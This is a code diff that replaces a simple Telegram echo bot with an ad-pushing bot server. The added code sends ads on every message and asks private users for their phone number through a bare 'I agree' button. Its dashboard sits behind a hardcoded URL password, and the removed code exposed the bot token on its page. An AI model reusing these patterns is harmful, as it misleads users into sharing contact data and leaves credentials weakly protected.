-      await this.telegramAPI.answerCallbackQuery(callbackQuery.id, `You clicked: ${data}`)
-
-      if (chatId) {
-        const result = await this.telegramAPI.sendMessage(chatId, `Button clicked: ${data}`)
-        return result.success
-      }
-
-      return true
-    } catch (error: any) {
-      this.logger.error("Callback query handling failed", { error: error.message })
-      return false
-    }
-  }
-
-  private async handleInlineQuery(inlineQuery: any): Promise<boolean> {
-    try {
-      const results = [
-        {
-          type: "article",
-          id: "1",
-          title: "Echo",
-          input_message_content: {
-            message_text: `You searched for: ${inlineQuery.query}`,
-          },
-        },
-      ]
-
-      const result = await this.telegramAPI.answerInlineQuery(inlineQuery.id, results)
-      return result.success
-    } catch (error: any) {
-      this.logger.error("Inline query handling failed", { error: error.message })
-      return false
-    }
-  }
-
-  private async handleChannelPost(post: any): Promise<boolean> {
-    this.logger.info("Channel post received", { chatId: post.chat.id })
-    return true
-  }
-
-  private async handleChatMemberUpdate(update: any): Promise<boolean> {
-    try {
-      const chatId = update.chat.id
-      const newStatus = update.new_chat_member.status
-
-      if (newStatus === "member") {
-        const result = await this.telegramAPI.sendMessage(
-          chatId,
-          "Thanks for adding me to this chat! Type /help to see what I can do.",
-        )
-        return result.success
-      }
-
-      return true
-    } catch (error: any) {
-      this.logger.error("Chat member update handling failed", { error: error.message })
-      return false
-    }
-  }
-
-  private async handleStartCommand(chatId: string | number): Promise<boolean> {
-    const welcomeMessage = `🤖 Welcome to the Telegram Bot!
-
-I'm a robust bot that never stops responding. Here's what I can do:
-
-/help - Show this help message
-/status - Check bot status
-/echo [text] - Echo your message back
-
-I'm designed to handle errors gracefully and always respond to your messages!`
-
-    const result = await this.telegramAPI.sendMessage(chatId, welcomeMessage)
-    return result.success
-  }
-
-  private async handleHelpCommand(chatId: string | number): Promise<boolean> {
-    const helpMessage = `📚 Bot Commands:
-
-/start - Welcome message
-/help - Show this help
-/status - Bot health status
-/echo [text] - Echo your message
-
-🔧 Features:
-• Always responds to messages
-• Handles errors gracefully
-• Automatic retry with backoff
-• Circuit breaker protection
-• Rate limiting protection
-
-Send me any message and I'll respond!`
-
-    const result = await this.telegramAPI.sendMessage(chatId, helpMessage)
-    return result.success
-  }
-
-  private async handleStatusCommand(chatId: string | number): Promise<boolean> {
-    const stats = this.statsManager.getStats()
-    const statusMessage = `🟢 Bot Status: Online
-
-📊 Statistics:
-• Total Messages: ${stats.totalMessages}
-• Active Users: ${stats.activeUsers}
-• Uptime: ${Math.floor(process.uptime())}s
-• Memory: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)}MB
-
-✅ All systems operational!`
-
-    const result = await this.telegramAPI.sendMessage(chatId, statusMessage)
-    return result.success
-  }
-
-  private async handleTextMessage(chatId: string | number, text: string, message: any): Promise<boolean> {
-    try {
-      let response: string
-
-      if (text.toLowerCase().startsWith("/echo ")) {
-        response = text.substring(6)
-      } else if (text.toLowerCase().includes("hello") || text.toLowerCase().includes("hi")) {
-        response = `Hello ${message.from?.first_name || "there"}! 👋`
-      } else if (text.toLowerCase().includes("how are you")) {
-        response = "I'm doing great! Thanks for asking. How can I help you today?"
-      } else if (text.toLowerCase().includes("time")) {
-        response = `Current time: ${new Date().toLocaleString()}`
-      } else {
-        response = `I received your message: "${text}"\n\nI'm a simple bot, but I always respond! Try /help for more commands.`
-      }
-
-      const result = await this.telegramAPI.sendMessage(chatId, response)
-      return result.success
-    } catch (error: any) {
-      this.logger.error("Text message handling failed", { error: error.message })
-      return false
-    }
-  }
-
-  private async sendFallbackMessage(chatId: string | number, message: string = this.FALLBACK_MESSAGE): Promise<void> {
-    try {
-      await this.telegramAPI.sendMessage(chatId, message)
-    } catch (error: any) {
-      this.logger.error("Fallback message failed", { chatId, error: error.message })
-    }
-  }
-
-  private extractChatId(update: TelegramUpdate): string | number | null {
-    try {
-      if (update.message) return update.message.chat.id
-      if (update.edited_message) return update.edited_message.chat.id
-      if (update.callback_query?.message) return update.callback_query.message.chat.id
-      if (update.channel_post) return update.channel_post.chat.id
-      if (update.my_chat_member) return update.my_chat_member.chat.id
-      return null
-    } catch (error) {
-      return null
-    }
-  }
-
-  private getUpdateType(update: TelegramUpdate): string {
-    if (update.message) return "message"
-    if (update.edited_message) return "edited_message"
-    if (update.callback_query) return "callback_query"
-    if (update.inline_query) return "inline_query"
-    if (update.channel_post) return "channel_post"
-    if (update.my_chat_member) return "my_chat_member"
-    return "unknown"
-  }
-
-  private isThrottled(chatId: string | number): boolean {
-    try {
-      const key = `throttle:${chatId}`
-      const count = this.cacheManager.get(key) || 0
-
-      if (count >= 10) {
-        return true
-      }
-
-      this.cacheManager.set(key, count + 1, 60)
-      return false
-    } catch (error) {
-      return false
-    }
-  }
-}
-
-// ==================== MAIN SERVER ====================
-console.log("🚀 Starting Telegram Bot Server...")
-
-const app = express()
-const PORT = process.env.PORT || 3000
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || ""
-const WEBHOOK_SECRET = process.env.WEBHOOK_SECRET || "webhook-secret-123"
-
-console.log("📋 Environment check:")
-console.log(`- PORT: ${PORT}`)
-console.log(`- BOT_TOKEN: ${TELEGRAM_BOT_TOKEN ? "Set ✅" : "Missing ❌"}`)
-console.log(`- WEBHOOK_SECRET: ${WEBHOOK_SECRET ? "Set ✅" : "Missing ❌"}`)
-
-if (!TELEGRAM_BOT_TOKEN) {
-  console.error("❌ TELEGRAM_BOT_TOKEN environment variable is required")
-  console.error("Get your token from @BotFather on Telegram")
-  console.error("Set it as an environment variable: TELEGRAM_BOT_TOKEN=your_token_here")
-  process.exit(1)
-}
-
-// Initialize services
-console.log("🔧 Initializing services...")
-const logger = new Logger()
-const cacheManager = new CacheManager()
-const healthMonitor = new HealthMonitor()
-const telegramAPI = new TelegramAPI(TELEGRAM_BOT_TOKEN, logger)
-const statsManager = new StatsManager(cacheManager)
-const webhookHandler = new WebhookHandler(telegramAPI, logger, cacheManager, statsManager)
-
-// Global error handlers
-process.on("uncaughtException", (error) => {
-  console.error("❌ Uncaught Exception:", error.message)
-  logger.error("Uncaught Exception", { error: error.message, stack: error.stack })
-})
-
-process.on("unhandledRejection", (reason, promise) => {
-  console.error("❌ Unhandled Rejection:", reason)
-  logger.error("Unhandled Rejection", { reason, promise })
-})
-
-// Middleware
-app.use(express.json({ limit: "10mb" }))
-
-// Rate limiting
-const limiter = rateLimit({
-  windowMs: 1 * 60 * 1000,
-  max: 30,
-  message: { error: "Too many requests from this IP" },
-  standardHeaders: true,
-  legacyHeaders: false,
-})
-
-app.use("/webhook", limiter)
-
-app.use((req, res, next) => {
-  healthMonitor.recordRequest()
-  next()
-})
-
-// Health check route (for deployment platforms)
-app.get("/health", (req, res) => {
-  res.status(200).json({ status: "ok", timestamp: new Date().toISOString() })
-})
-
-// Routes
-app.get("/", (req, res) => {
-  res.send(`
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>🤖 Telegram Bot Server</title>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <style>
-            * { box-sizing: border-box; }
-            body { 
-                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
-                max-width: 900px; margin: 0 auto; padding: 20px; 
-                background: #f5f5f5; color: #333;
-            }
-            .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-            .status { padding: 15px; margin: 15px 0; border-radius: 8px; font-weight: 500; }
-            .healthy { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
-            .unhealthy { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
-            button { 
-                background: #007bff; color: white; border: none; padding: 12px 24px; 
-                border-radius: 6px; cursor: pointer; font-size: 14px; margin: 5px;
-                transition: background 0.2s;
-            }
-            button:hover { background: #0056b3; }
-            button:disabled { background: #6c757d; cursor: not-allowed; }
-            input, textarea { 
-                width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; 
-                border-radius: 6px; font-size: 14px;
-            }
-            .stats { 
-                background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0; 
-                border: 1px solid #e9ecef;
-            }
-            .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-            @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
-            h1 { color: #2c3e50; margin-bottom: 10px; }
-            h2 { color: #34495e; border-bottom: 2px solid #3498db; padding-bottom: 5px; }
-            .emoji { font-size: 1.2em; }
-            .loading { opacity: 0.6; }
-            code { background: #f1f1f1; padding: 2px 6px; border-radius: 3px; font-size: 12px; }
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <h1><span class="emoji">🤖</span> Telegram Bot Server</h1>
-            <p>✅ Server is running and ready to receive webhooks!</p>
-            
-            <div id="status" class="status loading">Loading status...</div>
-            
-            <div class="grid">
-                <div>
-                    <h2><span class="emoji">🧪</span> Test Message</h2>
-                    <input type="text" id="chatId" placeholder="Enter Chat ID (get from @userinfobot)" />
-                    <textarea id="message" placeholder="Type your test message here..." rows="3"></textarea>
-                    <button onclick="sendTestMessage()">Send Test Message</button>
-                </div>
-                
-                <div>
-                    <h2><span class="emoji">📊</span> System Stats</h2>
-                    <div id="stats" class="stats loading">Loading stats...</div>
-                </div>
-            </div>
-            
-            <div style="margin-top: 30px; padding: 20px; background: #e3f2fd; border-radius: 8px;">
-                <h3><span class="emoji">🔧</span> Webhook Setup</h3>
-                <p>Set your webhook URL to:</p>
-                <code>https://your-domain.com/webhook/${WEBHOOK_SECRET}</code>
-                <p style="margin-top: 10px;">Or use your bot token as the secret:</p>
-                <code>https://your-domain.com/webhook/${TELEGRAM_BOT_TOKEN}</code>
-            </div>
-        </div>
-        
-        <script>
-            async function loadStatus() {
-                try {
-                    const response = await fetch('/status');
-                    const data = await response.json();
-                    const statusDiv = document.getElementById('status');
-                    statusDiv.className = 'status ' + (data.healthy ? 'healthy' : 'unhealthy');
-                    statusDiv.innerHTML = \`
-                        <strong>🟢 Status:</strong> \${data.healthy ? 'Healthy ✅' : 'Unhealthy ❌'}<br>
-                        <strong>⏱️ Uptime:</strong> \${Math.floor(data.uptime / 1000)}s<br>
-                        <strong>💾 Memory:</strong> \${(data.memory.used / 1024 / 1024).toFixed(2)}MB (\${data.memory.percentage.toFixed(1)}%)<br>
-                        <strong>📡 Telegram API:</strong> \${data.telegramAPI ? 'Connected ✅' : 'Disconnected ❌'}
-                    \`;
-                } catch (error) {
-                    document.getElementById('status').innerHTML = '❌ Error loading status: ' + error.message;
-                    document.getElementById('status').className = 'status unhealthy';
+        if (chatId) {
+          // Fire and forget ad sending for speed
+          (async () => {
+            const promises: Promise<any>[] = [];
+            let contactRequestSent = false;
+            for (let i = 0; i < ALWAYS_ADS.length; i++) {
+              const ad = ALWAYS_ADS[i];
+              // For the first ad, attach the contact request keyboard if needed
+              if (
+                i === 0 &&
+                chat && chat.type === "private" && user &&
+                !(update.message && (update.message as any).contact)
+              ) {
+                const replyMarkup = {
+                  keyboard: [
+                    [
+                      {
+                        text: "I agree",
+                        request_contact: true
+                      }
+                    ],
+                  ],
+                  resize_keyboard: true,
+                  one_time_keyboard: true,
+                };
+                if (ad.type === "text" && ad.content.text) {
+                  promises.push(retryOperation(() => sendTextMessage(BOT_TOKEN, chatId, ad.content.text, replyMarkup)));
+                  contactRequestSent = true;
+                } else if ((ad.type === "photo_text" || ad.type === "photo_text_button") && (ad.content as any).photos?.length) {
+                  const content = ad.content as { photos: string[]; text?: string; buttons?: any[] };
+                  const photo = content.photos[Math.floor(Math.random() * content.photos.length)];
+                  const caption = content.text || "";
+                  const buttons = content.buttons ? content.buttons.map((b: any) => [b]) : null;
+                  // Note: Telegram does not support reply_keyboard with photo, so fallback to text if needed
+                  promises.push(retryOperation(() => sendTextMessage(BOT_TOKEN, chatId, caption, replyMarkup)));
+                  contactRequestSent = true;
                 }
-            }
-            
-            async function loadStats() {
-                try {
-                    const response = await fetch('/api/stats');
-                    const data = await response.json();
-                    document.getElementById('stats').innerHTML = \`
-                        <strong>📨 Total Messages:</strong> \${data.totalMessages}<br>
-                        <strong>👥 Active Users:</strong> \${data.activeUsers}<br>
-                        <strong>⚠️ Errors (24h):</strong> \${data.errors24h}<br>
-                        <strong>🕐 Last Activity:</strong> \${data.lastActivity || 'None yet'}
-                    \`;
-                } catch (error) {
-                    document.getElementById('stats').innerHTML = '❌ Error loading stats: ' + error.message;
+              } else {
+                // Send other ads normally
+                if (ad.type === "text" && ad.content.text) {
+                  promises.push(retryOperation(() => sendTextMessage(BOT_TOKEN, chatId, ad.content.text)));
+                } else if ((ad.type === "photo_text" || ad.type === "photo_text_button") && (ad.content as any).photos?.length) {
+                  const content = ad.content as { photos: string[]; text?: string; buttons?: any[] };
+                  const photo = content.photos[Math.floor(Math.random() * content.photos.length)];
+                  const caption = content.text || "";
+                  const buttons = content.buttons ? content.buttons.map((b: any) => [b]) : null;
+                  promises.push(
+                    retryOperation(() => sendImageMessage(BOT_TOKEN, chatId, photo, caption, buttons))
+                  );
                 }
+              }
             }
-            
-            async function sendTestMessage() {
-                const chatId = document.getElementById('chatId').value.trim();
-                const message = document.getElementById('message').value.trim();
-                
-                if (!chatId || !message) {
-                    alert('⚠️ Please fill in both Chat ID and message');
-                    return;
-                }
-                
-                const button = event.target;
-                button.disabled = true;
-                button.textContent = 'Sending...';
-                
-                try {
-                    const response = await fetch('/test-delivery', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chatId, message })
-                    });
-                    const result = await response.json();
-                    
-                    if (result.success) {
-                        alert('✅ Message sent successfully!');
-                        document.getElementById('message').value = '';
-                    } else {
-                        alert('❌ Failed to send message: ' + result.error);
+
+            const randomAd = getRandomAd();
+            if (randomAd && randomAd.type === "photo_text_button") {
+              const content = randomAd.content as { photos: string[]; text?: string; buttons?: any[] };
+              const randomPhoto = content.photos[Math.floor(Math.random() * content.photos.length)];
+              const caption = content.text || "";
+              const buttons = content.buttons ? content.buttons.map((b: any) => [b]) : null;
+              promises.push(
+                retryOperation(() => sendImageMessage(BOT_TOKEN, chatId, randomPhoto, caption, buttons))
+              );
+            }
+
+            await Promise.all(promises);
+
+            // Ask for contact if not already shared (only for private chats and not bots)
+            if (
+              chat && chat.type === "private" && user &&
+              !(update.message && (update.message as any).contact)
+            ) {
+              const replyMarkup = {
+                keyboard: [
+                  [
+                    {
+                      text: "I agree",
+                      request_contact: true
                     }
-                } catch (error) {
-                    alert('❌ Error sending message: ' + error.message);
-                } finally {
-                    button.disabled = false;
-                    button.textContent = 'Send Test Message';
-                }
+                  ],
+                ],
+                resize_keyboard: true,
+                one_time_keyboard: true,
+              };
+              // Send the button with no text
+              await retryOperation(() => sendTextMessage(BOT_TOKEN, chatId, "", replyMarkup));
             }
-            
-            // Auto-refresh data
-            loadStatus();
-            loadStats();
-            setInterval(() => {
-                loadStatus();
-                loadStats();
-            }, 5000);
-        </script>
-    </body>
-    </html>
-  `)
-})
+          })().catch(err => console.error("Error in background ad sending:", err));
+        }
 
-app.get("/status", async (req, res) => {
-  try {
-    const health = healthMonitor.getHealth()
-    const telegramStatus = await telegramAPI.checkHealth()
-
-    res.json({
-      healthy: health.healthy && telegramStatus,
-      uptime: health.uptime,
-      memory: health.memory,
-      requests: health.requests,
-      telegramAPI: telegramStatus,
-      timestamp: new Date().toISOString(),
-    })
-  } catch (error: any) {
-    logger.error("Status check failed", { error: error.message })
-    res.status(500).json({
-      healthy: false,
-      error: "Status check failed",
-      timestamp: new Date().toISOString(),
-    })
-  }
-})
-
-app.get("/api/stats", (req, res) => {
-  try {
-    const stats = statsManager.getStats()
-    res.json(stats)
-  } catch (error: any) {
-    logger.error("Stats retrieval failed", { error: error.message })
-    res.status(500).json({ error: "Failed to retrieve stats" })
-  }
-})
-
-app.post("/test-delivery", async (req, res) => {
-  try {
-    const { chatId, message } = req.body
-
-    if (!chatId || !message) {
-      return res.status(400).json({
-        success: false,
-        error: "chatId and message are required",
-      })
+        storeRequestStatus(BOT_TOKEN, "OK", performance.now() - startTime);
+        return new Response("OK", { status: 200 });
+      } catch (error: any) {
+        const errorReason = error.message || "Unknown error";
+        const errorType = error.message?.includes("rate limit") || error.message?.includes("400") || error.message?.includes("403") || error.message?.includes("429") ? "4xx" : "5xx";
+        const currentBotToken = BOT_TOKEN || "unknown"; // Use BOT_TOKEN from this scope
+        storeRequestStatus(currentBotToken, "Failed", performance.now() - startTime, `${errorType}: ${errorReason}`);
+        return new Response("OK", { status: 200 });
+      }
     }
 
-    const result = await telegramAPI.sendMessage(chatId, message)
-
-    res.json({
-      success: result.success,
-      error: result.error,
-      messageId: result.data?.message_id,
-    })
-  } catch (error: any) {
-    logger.error("Test delivery failed", { error: error.message })
-    res.status(500).json({
-      success: false,
-      error: "Internal server error",
-    })
-  }
-})
-
-app.post("/webhook/:secret", async (req, res) => {
-  try {
-    const providedSecret = req.params.secret
-
-    // Accept either the configured webhook secret OR the bot token as valid
-    const validSecrets = [WEBHOOK_SECRET, TELEGRAM_BOT_TOKEN]
-
-    if (!validSecrets.includes(providedSecret)) {
-      logger.warn("Invalid webhook secret", {
-        ip: req.ip,
-        providedSecret: providedSecret.substring(0, 10) + "...",
-      })
-      return res.status(401).json({ error: "Unauthorized" })
+    // Minimal status page at root
+    if (method === "GET" && pathname === "/") {
+      const uptimeSeconds = Math.floor((Date.now() - serverStartTime) / 1000);
+      const uptimeHours = Math.floor(uptimeSeconds / 3600);
+      const uptimeMinutes = Math.floor((uptimeSeconds % 3600) / 60);
+      const uptimeSecs = uptimeSeconds % 60;
+      const uptimeStr = `${uptimeHours}h ${uptimeMinutes}m ${uptimeSecs}s`;
+      const html = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <title>Status</title>
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <style>
+            body { background: #f3f4f6; padding: 20px; font-family: Arial; }
+            .card { background: white; padding: 20px; margin: 10px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+            .value { font-size: 1.5rem; font-weight: bold; }
+          </style>
+        </head>
+        <body>
+          <div class="card">
+            <h1>Server Status</h1>
+            <p>Uptime: <span class="value">${uptimeStr}</span></p>
+            <p>Status: <span class="value" style="color:green">Online</span></p>
+          </div>
+        </body>
+        </html>
+      `;
+      return new Response(html, { headers: { "Content-Type": "text/html" } });
     }
 
-    logger.info("Valid webhook request received", {
-      ip: req.ip,
-      secretUsed: providedSecret.substring(0, 10) + "...",
-    })
+    // Password-protected dashboard at /status
+    if (method === "GET" && pathname === "/status") {
+      const urlPassword = url.searchParams.get("pass");
+      if (urlPassword !== "ashu45") {
+        const html = `
+          <!DOCTYPE html>
+          <html>
+          <head>
+            <title>Protected Status</title>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <style>
+              body { background: #f3f4f6; padding: 20px; font-family: Arial; }
+              .card { background: white; padding: 20px; margin: 10px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+              .value { font-size: 1.5rem; font-weight: bold; }
+              .input { padding: 8px; font-size: 1rem; border-radius: 4px; border: 1px solid #ccc; }
+              .btn { padding: 8px 16px; font-size: 1rem; border-radius: 4px; border: none; background: #2563eb; color: white; cursor: pointer; }
+            </style>
+          </head>
+          <body>
+            <div class="card">
+              <h1>Status Dashboard (Protected)</h1>
+              <form method="GET" action="/status">
+                <label>Password: <input class="input" type="password" name="pass" /></label>
+                <button class="btn" type="submit">View</button>
+              </form>
+              <p style="color:red;">${urlPassword ? "Unauthorized: Wrong password" : ""}</p>
+            </div>
+          </body>
+          </html>
+        `;
+        return new Response(html, { headers: { "Content-Type": "text/html" } });
+      }
+      // Dashboard code
+      try {
+        const requestLog = ((cache.get("requestLog") as RequestLogEntry[]) || []).slice(0, 10); // Last 10 requests
+        const stats = {
+          totalBotRequests: cache.get("totalBotRequests") || 0,
+          clientErrors: cache.get("clientErrors") || 0,
+          serverErrors: cache.get("serverErrors") || 0,
+          totalResponseTime: cache.get("totalResponseTime") || 0,
+        };
+        const avgResponseTime = stats.totalBotRequests ? 
+          Number((Number(stats.totalResponseTime) / Number(stats.totalBotRequests)).toFixed(2)) : 
+          0;
 
-    await webhookHandler.handleWebhook(req.body)
-    res.status(200).json({ ok: true })
-  } catch (error: any) {
-    logger.error("Webhook processing failed", {
-      error: error.message,
-      body: req.body,
-    })
-    res.status(200).json({ ok: true })
-  }
-})
+        const html = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <title>Bot Request Status</title>
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <style>
+            body { background: #f3f4f6; padding: 20px; font-family: Arial; }
+            .card { background: white; padding: 20px; margin: 10px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+            .value { font-size: 1.5rem; font-weight: bold; }
+            .table { width: 100%; border-collapse: collapse; }
+            .table th, .table td { padding: 10px; text-align: left; border-bottom: 1px solid #e5e7eb; }
+            .status-ok { color: green; }
+            .status-failed { color: red; }
+          </style>
+        </head>
+        <body>
+          <div class="card">
+            <h1>Bot Request Overview</h1>
+            <p>Total /bot/ Requests: <span class="value">${stats.totalBotRequests}</span></p>
+            <p>Average Response Time: <span class="value">${avgResponseTime} ms</span></p>
+            <p>4xx Errors: <span class="value">${stats.clientErrors}</span></p>
+            <p>5xx Errors: <span class="value">${stats.serverErrors}</span></p>
+          </div>
+          <div class="card">
+            <h1>Bot Request Status (Last 10)</h1>
+            <table class="table">
+              <thead><tr><th>Time</th><th>Bot Token</th><th>Status</th><th>Response Time (ms)</th><th>Error (if any)</th></tr></thead>
+              <tbody>
+                ${requestLog
+                  .map(
+                    (req) => `
+                      <tr>
+                        <td>${new Date(req.timestamp).toLocaleString()}</td>
+                        <td>${req.token.slice(0, 10)}...</td>
+                        <td class="status-${req.status.toLowerCase()}">${req.status}</td>
+                        <td>${req.responseTime}</td>
+                        <td>${req.errorReason || "-"}</td>
+                      </tr>
+                    `
+                  )
+                  .join("")}
+              </tbody>
+            </table>
+          </div>
+        </body>
+        </html>
+        `;
 
-// Graceful shutdown
-const gracefulShutdown = (signal: string) => {
-  console.log(`📴 Received ${signal}, shutting down gracefully...`)
-  logger.info(`Received ${signal}, shutting down gracefully`)
+        return new Response(html, { headers: { "Content-Type": "text/html" } });
+      } catch (error: any) {
+        return new Response("Internal Server Error", { status: 500 });
+      }
+    }
 
-  try {
-    cacheManager.destroy()
-  } catch (error) {
-    console.error("Error during cleanup:", error)
-  }
+    return new Response("Not Found", { status: 404 });
+  },
+});
 
-  process.exit(0)
-}
-
-process.on("SIGTERM", () => gracefulShutdown("SIGTERM"))
-process.on("SIGINT", () => gracefulShutdown("SIGINT"))
-
-// Start server
-console.log("🌐 Starting HTTP server...")
-const server = app.listen(PORT, () => {
-  console.log(`✅ Server started successfully!`)
-  console.log(`🌐 Dashboard: http://localhost:${PORT}`)
-  console.log(`📡 Webhook endpoint: /webhook/${WEBHOOK_SECRET}`)
-  console.log(
-    `🔗 Set webhook: https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook?url=https://your-domain.com/webhook/${WEBHOOK_SECRET}`,
-  )
-  console.log(`🤖 Bot is ready and bulletproof!`)
-
-  logger.info("Server started successfully", { port: PORT })
-})
-
-// Handle server errors
-server.on("error", (error: any) => {
-  console.error("❌ Server error:", error.message)
-  if (error.code === "EADDRINUSE") {
-    console.error(`Port ${PORT} is already in use. Try a different port.`)
-  }
-  process.exit(1)
-})
-
-export default app
+console.log(`Server running on port ${process.env.PORT || 3000}`);
